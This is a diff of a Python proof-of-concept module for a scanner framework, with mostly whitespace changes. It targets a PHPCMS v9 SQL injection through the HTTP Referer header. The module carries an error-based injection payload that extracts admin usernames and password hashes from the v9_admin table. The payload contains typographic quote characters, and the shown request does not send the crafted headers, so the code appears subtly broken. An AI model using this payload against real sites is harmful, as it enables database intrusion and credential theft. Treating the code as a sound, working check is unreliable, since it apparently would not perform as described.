@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PHPCMS_0025' # 平台漏洞编号，留空
+    vuln_id = 'PHPCMS_0025'  # 平台漏洞编号，留空
     name = 'PHPCMSv9 SQL注入（Rerferer注入）'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2013-01-08'  # 漏洞公布时间
     desc = '''
         由于poster_click函数在插入数据库的时候，没对http-referer做过滤，然后产生了注入。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'PHPCMS'  # 漏洞应用名称
     product_version = 'PHPCMSv9'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'a58f6e88-e882-46ee-896f-2b4da43e7746'
@@ -31,13 +33,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             s = requests.session()
             s.get(self.target)
             payload = "/index.php?m=poster&c=index&a=poster_click&id=1"
             url = self.target + payload
             headers = {
-                'Referer':"http://{target}’,(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(SELECT concat(username,0x5f,md5(c),0x5f,encrypt) FROM v9_admin WHERE 1 ))a from information_schema.tables group by a)b),’1′)#".format(target=self.target)
+                'Referer': "http://{target}’,(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(SELECT concat(username,0x5f,md5(c),0x5f,encrypt) FROM v9_admin WHERE 1 ))a from information_schema.tables group by a)b),’1′)#".format(target=self.target)
             }
             r = s.get(url)
 
@@ -50,6 +52,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
